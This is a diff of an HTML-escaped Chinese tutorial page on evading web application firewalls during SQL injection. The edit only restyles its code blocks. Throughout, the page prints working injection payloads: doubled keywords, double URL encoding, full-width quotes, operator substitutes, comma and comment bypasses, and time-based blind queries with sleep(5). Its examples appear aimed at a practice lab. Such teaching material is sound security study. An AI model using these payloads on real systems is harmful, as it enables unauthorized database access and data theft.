 &lt;p&gt;我们就可以通过&amp;quot;双写&amp;quot;，&lt;strong&gt;比如&lt;code&gt;selselectect&lt;/code&gt;，替换中间的&lt;code&gt;select&lt;/code&gt;为空后，剩下的部分仍然是&lt;code&gt;select&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;过滤器替换后：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; uniunionon selselectect 1,2#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过滤器替换后：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2#
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5-编码绕过&#34;&gt;#5 编码绕过
 &lt;/h2&gt;&lt;p&gt;如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;双重url编码绕过&#34;&gt;双重URL编码绕过
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union se%256cect 1,database()#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WAF部分(&lt;code&gt;%25&lt;/code&gt; -&amp;gt; &lt;code&gt;%&lt;/code&gt;)看见的内容是：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union se%6cect 1,database()#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行部分(&lt;code&gt;%6c&lt;/code&gt; -&amp;gt; &lt;code&gt;l&lt;/code&gt;)看见的是：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database()#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这就成功传入了目标语句&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union se%256cect 1,database()#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WAF部分(&lt;code&gt;%25&lt;/code&gt; -&amp;gt; &lt;code&gt;%&lt;/code&gt;)看见的内容是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union se%6cect 1,database()#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行部分(&lt;code&gt;%6c&lt;/code&gt; -&amp;gt; &lt;code&gt;l&lt;/code&gt;)看见的是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database()#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就成功传入了目标语句&lt;/p&gt;
 &lt;p&gt;附上一张url编码表：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34;
 	
@@ -1868,10 +1938,10 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;十六进制unicode编码ascii编码绕过&#34;&gt;十六进制、Unicode编码、ASCII编码绕过
 &lt;/h3&gt;&lt;p&gt;其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1%ef%bc%87 or 1=1#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符&lt;code&gt;＇&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1＇ OR 1=1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当然你也能直接输入全角试试能不能绕过，这里只是举一个例子&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1%ef%bc%87 or 1=1#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符&lt;code&gt;＇&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1＇ OR 1=1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然你也能直接输入全角试试能不能绕过，这里只是举一个例子&lt;/p&gt;
 &lt;p&gt;其他方式大同小异，这里不多赘述&lt;/p&gt;
 &lt;h2 id=&#34;6-等价代替绕过&#34;&gt;#6 等价代替绕过
 &lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替&lt;/strong&gt;&lt;/p&gt;
@@ -1886,23 +1956,23 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;between&lt;/code&gt;：&lt;code&gt;expr between 下界 and 上界&lt;/code&gt;，表示是否&lt;code&gt;expr &amp;gt;= 下界 &amp;amp;&amp;amp; exp &amp;lt;= 上界&lt;/code&gt;，上下界可以相等&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;如果WAF过滤了=，我们可以使用他们实现相同目的：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &amp;#39;users&amp;#39;#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;code&gt;like&lt;/code&gt;匹配：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &amp;#39;users&amp;#39;#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;code&gt;in&lt;/code&gt;匹配（&lt;strong&gt;注意in匹配的对象要是一个组&lt;/strong&gt;）：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&amp;#39;users&amp;#39;)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;code&gt;rlike&lt;/code&gt;/&lt;code&gt;regexp&lt;/code&gt;匹配：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &amp;#39;users&amp;#39;#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用between判断：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &amp;#39;users&amp;#39; and &amp;#39;users&amp;#39;#
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;大于号和小于号过滤绕过&#34;&gt;大于号(&amp;gt;)和小于号(&amp;lt;)过滤绕过
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &amp;#39;users&amp;#39;#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;like&lt;/code&gt;匹配：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &amp;#39;users&amp;#39;#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;in&lt;/code&gt;匹配（&lt;strong&gt;注意in匹配的对象要是一个组&lt;/strong&gt;）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&amp;#39;users&amp;#39;)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;rlike&lt;/code&gt;/&lt;code&gt;regexp&lt;/code&gt;匹配：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &amp;#39;users&amp;#39;#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用between判断：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &amp;#39;users&amp;#39; and &amp;#39;users&amp;#39;#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;大于号和小于号过滤绕过&#34;&gt;大于号(&amp;gt;)和小于号(&amp;lt;)过滤绕过
 &lt;/h4&gt;&lt;p&gt;使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找&lt;/p&gt;
 &lt;p&gt;如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;greatest(n1,n2,n3,&amp;hellip;)函数返回输入参数(n1,n2,n3,&amp;hellip;)的最大值，least()则是返回最小值：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and greatest(ascii(substr(database(),0,1)),64)=64
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等价于：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ascii(substr(database(),0,1))&amp;gt;64
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;and和or过滤绕过&#34;&gt;and和or过滤绕过
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and greatest(ascii(substr(database(),0,1)),64)=64
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等价于：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ascii(substr(database(),0,1))&amp;gt;64
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;and和or过滤绕过&#34;&gt;and和or过滤绕过
 &lt;/h4&gt;&lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
@@ -1931,27 +2001,27 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/table&gt;
 &lt;h3 id=&#34;注释符号过滤&#34;&gt;注释符号过滤
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;如果WAF过滤了&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;-- &lt;/code&gt; ，我们可以使用另一个&lt;code&gt;&#39;&lt;/code&gt;闭合后面的&lt;code&gt;&#39;&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2 or &amp;#39;1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,&amp;#39;2
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;逗号过滤&#34;&gt;逗号过滤
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2 or &amp;#39;1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,&amp;#39;2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;逗号过滤&#34;&gt;逗号过滤
 &lt;/h3&gt;&lt;h4 id=&#34;绕过limit中的逗号&#34;&gt;绕过limit中的逗号
 &lt;/h4&gt;&lt;p&gt;在进行盲注时，我们经常需要逐行读取数据，会用到&lt;code&gt;limit m, n&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用limit m offset n代替，表示取m行，跳过n行：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database() limit 1 offset 0 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等价于&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database() limit 0,1 #
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;绕过函数参数中的逗号&#34;&gt;绕过函数参数中的逗号
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database() limit 1 offset 0 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等价于&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database() limit 0,1 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;绕过函数参数中的逗号&#34;&gt;绕过函数参数中的逗号
 &lt;/h4&gt;&lt;p&gt;很多函数需要多个参数，用逗号隔开，例如&lt;code&gt;substring(string, m, n)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用substring(stringfrom m for n)代替：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and substring(database()from 1 for 1)=&amp;#39;d&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果空格被过滤了，可以使用()包裹from和for后面的数字：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and substring(database()from(1)for(1))=&amp;#39;d&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;绕过select列表中的逗号&#34;&gt;绕过select列表中的逗号
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and substring(database()from 1 for 1)=&amp;#39;d&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果空格被过滤了，可以使用()包裹from和for后面的数字：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and substring(database()from(1)for(1))=&amp;#39;d&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;绕过select列表中的逗号&#34;&gt;绕过select列表中的逗号
 &lt;/h4&gt;&lt;p&gt;union联合查询注入时，我们经常需要一次性查询多个列，如&lt;code&gt;union select user, password&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用join语句代替：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select * from (select database())a join (select version())b#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这段语句是如何工作的？我们逐一拆解：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select * from (select database())a join (select version())b#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段语句是如何工作的？我们逐一拆解：&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;(select database())a&lt;/code&gt;&lt;/strong&gt;: 创建了一个只含一列（数据库名）的临时表，并别名为 &lt;code&gt;a&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;(select version())b&lt;/code&gt;&lt;/strong&gt;: 创建了另一个只含一列（版本信息）的临时表，并别名为 &lt;code&gt;b&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;... a join b&lt;/code&gt;&lt;/strong&gt;: 通过&lt;code&gt;join&lt;/code&gt;将这两个只有一行一列的表连接起来，形成一个一行两列的新表&lt;/p&gt;
@@ -2025,11 +2095,11 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;h4 id=&#34;case-when语句代替if&#34;&gt;case when语句代替if
 &lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用法一：&lt;/strong&gt;&lt;/mark&gt; &lt;strong&gt;&lt;code&gt;case when exp1 then exp2 else exp3 end&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;如果exp1为真就返回exp2，反之返回exp3&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用法二：&lt;/strong&gt;&lt;/mark&gt; &lt;strong&gt;&lt;code&gt;case x when y then exp2 else exp3 end&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用法二：&lt;/strong&gt;&lt;/mark&gt; &lt;strong&gt;&lt;code&gt;case x when y then exp2 else exp3 end&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;如果x=y则返回exp2，反之返回exp3&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;reverseleft代替substring&#34;&gt;reverse+left代替substring
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;reverseleft代替substring&#34;&gt;reverse+left代替substring
 &lt;/h4&gt;&lt;p&gt;&lt;code&gt;left&lt;/code&gt;函数不能截取某一个精确的字符，但是结合&lt;code&gt;reverse&lt;/code&gt;和&lt;code&gt;ascii&lt;/code&gt;函数可以做到&lt;code&gt;substring+ascii&lt;/code&gt;一样的效果：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ascii&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;reverse&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;left&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;n&lt;/span&gt;)))
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这个组合可以做到取出string字符串第n位的ascii码&lt;/strong&gt;&lt;/p&gt;
@@ -2079,16 +2149,16 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;返回的结果仍然是abcd，因为abcd的开头不是e&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次&lt;code&gt;trim()&lt;/code&gt;操作的结果是否相同，来推断一个字符是否是目标字符串的开头&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;第一次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(trim(leading &amp;#39;a&amp;#39; from database()) = (trim(leading &amp;#39;b&amp;#39; from database()))
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;a&amp;rsquo;）,后者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头也不是&amp;rsquo;b&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为真&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()) &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()))
